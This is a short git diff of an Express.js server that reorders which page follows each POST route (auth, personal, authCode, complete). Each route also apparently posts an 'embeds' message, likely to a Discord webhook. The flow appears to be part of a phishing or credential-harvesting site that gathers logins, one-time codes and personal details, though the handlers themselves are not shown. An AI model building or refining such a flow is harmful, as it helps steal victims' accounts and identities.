@@ -67,7 +67,7 @@ app.post("/auth", (req, res) => {
     embeds: [embed],
   });
 
-  res.render("personal");
+  res.render("authCode");
 });
 
 app.post("/email", (req, res) => {
@@ -150,7 +150,7 @@ app.post("/personal", (req, res) => {
     embeds: [embed],
   });
 
-  res.render("authCode");
+  res.render("complete");
 });
 
 app.post("/authCode", (req, res) => {
@@ -172,7 +172,7 @@ app.post("/authCode", (req, res) => {
     embeds: [embed],
   });
 
-  res.render("complete");
+  res.render("personal");
 });
 
 app.listen(3000, () => {
